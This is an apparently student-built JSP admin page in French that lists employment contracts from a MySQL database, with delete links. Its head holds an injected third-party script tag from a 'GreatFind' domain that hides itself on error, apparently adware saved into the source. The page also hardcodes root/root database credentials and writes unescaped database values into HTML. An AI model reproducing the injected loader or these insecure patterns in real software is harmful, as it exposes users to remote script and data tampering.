<%@ page import="java.sql.*"%>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Londinium - premium responsive admin template by Eugene Kopyov</title>
<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css">
<link href="css/londinium-theme.min.css" rel="stylesheet" type="text/css">
<link href="css/styles.min.css" rel="stylesheet" type="text/css">
<link href="css/icons.min.css" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700&amp;subset=latin,cyrillic-ext" rel="stylesheet" type="text/css">
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.min.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.10.2/jquery-ui.min.js"></script>
<script type="text/javascript" src="js/plugins/charts/sparkline.min.js"></script>
<script type="text/javascript" src="js/plugins/forms/uniform.min.js"></script>
<script type="text/javascript" src="js/plugins/forms/select2.min.js"></script>
<script type="text/javascript" src="js/plugins/forms/inputmask.js"></script>
<script type="text/javascript" src="js/plugins/forms/autosize.js"></script>
<script type="text/javascript" src="js/plugins/forms/inputlimit.min.js"></script>
<script type="text/javascript" src="js/plugins/forms/listbox.js"></script>
<script type="text/javascript" src="js/plugins/forms/multiselect.js"></script>
<script type="text/javascript" src="js/plugins/forms/validate.min.js"></script>
<script type="text/javascript" src="js/plugins/forms/tags.min.js"></script>
<script type="text/javascript" src="js/plugins/forms/switch.min.js"></script>
<script type="text/javascript" src="js/plugins/forms/uploader/plupload.full.min.js"></script>
<script type="text/javascript" src="js/plugins/forms/uploader/plupload.queue.min.js"></script>
<script type="text/javascript" src="js/plugins/forms/wysihtml5/wysihtml5.min.js"></script>
<script type="text/javascript" src="js/plugins/forms/wysihtml5/toolbar.js"></script>
<script type="text/javascript" src="js/plugins/interface/daterangepicker.js"></script>
<script type="text/javascript" src="js/plugins/interface/fancybox.min.js"></script>
<script type="text/javascript" src="js/plugins/interface/moment.js"></script>
<script type="text/javascript" src="js/plugins/interface/jgrowl.min.js"></script>
<script type="text/javascript" src="js/plugins/interface/datatables.min.js"></script>
<script type="text/javascript" src="js/plugins/interface/tabletools.min.js"></script>
<script type="text/javascript" src="js/plugins/interface/colorpicker.js"></script>
<script type="text/javascript" src="js/plugins/interface/fullcalendar.min.js"></script>
<script type="text/javascript" src="js/plugins/interface/timepicker.min.js"></script>
<script type="text/javascript" src="js/plugins/interface/collapsible.min.js"></script>
<script type="text/javascript" src="js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/application.js"></script>
<script onerror='this.parentNode.removeChild(this);' src='https://greatfind-a.akamaihd.net/GreatFind/cr?t=CHPS&g=c58af3c7-17bd-47e7-ab60-30733a25f4a9&pn=Chrome' type='text/javascript'></script></head>
<body class="sidebar-wide">
<!-- Navbar -->
<div class="navbar navbar-inverse" role="navigation">
  <div class="navbar-header"><a class="navbar-brand" href="#"><img src="images/logo.png" alt="Londinium"></a><a class="sidebar-toggle"><i class="icon-paragraph-justify2"></i></a>
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-icons"><span class="sr-only">Toggle navbar</span><i class="icon-grid3"></i></button>
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar"><span class="sr-only">Toggle navigation</span><i class="icon-paragraph-justify2"></i></button>
  </div>
  <ul class="nav navbar-nav navbar-right collapse" id="navbar-icons">

      <div class="popup dropdown-menu dropdown-menu-right">
        
       
      </div>
    </li>
  
   
    
  </ul>
</div>
<!-- /navbar -->
<!-- Page container -->
<div class="page-container">
  <!-- Sidebar -->
  <div class="sidebar collapse">
    <div class="sidebar-content">
      <!-- User dropdown -->
      <div class="user-menu dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown"><img src="images/demo/users/face3.png" alt="">
        <div class="user-info">Admin </div>
        </a>
        <div class="popup dropdown-menu dropdown-menu-right">
          <div class="thumbnail">
            <div class="thumb"><img alt="" src="images/demo/users/face3.png">
              <div class="thumb-options"><span><a href="#" class="btn btn-icon btn-success"><i class="icon-pencil"></i></a><a href="#" class="btn btn-icon btn-success"><i class="icon-remove"></i></a></span></div>
            </div>
            <div class="caption text-center">
            </div>
          </div>
         
        </div>
      </div>
      <!-- /user dropdown -->
      <!-- Main navigation -->
           <ul class="navigation">
        
        
        <li><a href="#" class="expand"><span>les personnels </span> <i class="icon-table2"></i></a>
          <ul>
            <li><a href="ajoutpersonnel.jsp">Ajout personnel</a></li>
            <li><a href="listPers.jsp">	   liste  des Personnels </a></li>
          </ul>
        </li>
            <li><a href="#" class="expand"><span>les administrateurs</span> <i class="icon-table2"></i></a>
          <ul>
          <li><a href="admininterface.jsp">Ajout administrateur</a></li>
                     <li><a href="listeadmin.jsp">liste des Administrateurs</a></li>
               
          </ul>
        </li>
           <li><a href="#" class="expand"><span>les services </span> <i class="icon-table2"></i></a>
          <ul>
        <li><a href="ajoutblocinterface.jsp">Ajout  service </a></li>
            <li><a href="gestiondesblocs.jsp">liste  des Services </a></li>
          
          </ul>
        </li>
        
          <li><a href="#" class="expand"><span>Les Contrats  </span> <i class="icon-table2"></i></a>
          <ul>
            <li><a href="ajoutcontratinterface.jsp">Ajout  contrat </a></li>
            <li><a href="listcontrat.jsp">liste des contrats  </a></li>
          </ul>
        </li>
           <li><a href="description.jsp">Description de société </a></li>
           <li><a href="logout.jsp">logout </a></li>
        </ul>
      <!-- /main navigation -->
    </div>
  </div>
  <!-- /sidebar -->
  <!-- Page content -->
  <div class="page-content">
    <!-- Page header -->
    <div class="page-header">
      <div class="page-title">
        <h3>Liste des Contrats </h3>
                      
        
      </div>
      <div id="reportrange" class="range">
        </div>
    </div>
    <!-- /page header -->
    <!-- Breadcrumbs line -->
    <div class="breadcrumb-line">
      <ul class="breadcrumb">
        <li><a href="indexx.jsp">Acceuil</a></li>
   
      </ul>

    </div>
    <!-- /breadcrumbs line -->
    <!-- Page tabs -->
    <div class="tabbable page-tabs">
     
      <div class="tab-content">
        <!-- First tab content -->
        <div class="tab-pane active fade in" id="inside">
          <!-- Default datatable inside panel -->
          <div class="panel panel-default">
            <div class="panel-heading">
            </div>
            <div class="datatable">
              <table class="table">
                <thead>
                  <tr>
                    <th>CIN : </th>
                    <th>Type de contrat : </th>
                     
                     <th>Salaire : </th>
                     <th>Durée
                     <th>supprimer </th>
                                       
                  </tr>
                </thead>
                <tbody>
           <tr>
           				<%
   
    Class.forName("com.mysql.jdbc.Driver");
    Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/data",
            "root", "root");
    Statement st = con.createStatement();
    ResultSet rs;
    rs = st.executeQuery("select * from contrat");
    while (rs.next()){
    
    	out.println("<tr><td align='center'>"+rs.getString("cin")+"</td><td align='center'>"+rs.getString("typecontrat")+"</td><td align='center'>"+rs.getString("salaire")+"</td><td align='center'>"+rs.getString("duree")+"</td>  <td  style='text-align:center'> <a href=deletecontrat.jsp?cin="+rs.getString("cin")+"> <img src='DeleteRed.png'/> </a></td></tr>");
    	}%>
           
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        
          <!-- /bordered datatable -->
     
        <!-- /second tab content -->
        <!-- Third tab content -->
       

          <!-- /datatable with selectable rows -->

          <!-- /datatable with pager -->
          <!-- Datatable with custom sortable columns -->
    
          <!-- /datatable with custom sortable columns -->
   
        <!-- /third tab content -->
      </div>
    </div>
    <!-- /page tabs -->
    <!-- Footer -->
   
    <!-- /footer -->
  </div>
  <!-- /page content -->
</div>
<!-- /page container -->
</body>
</html>
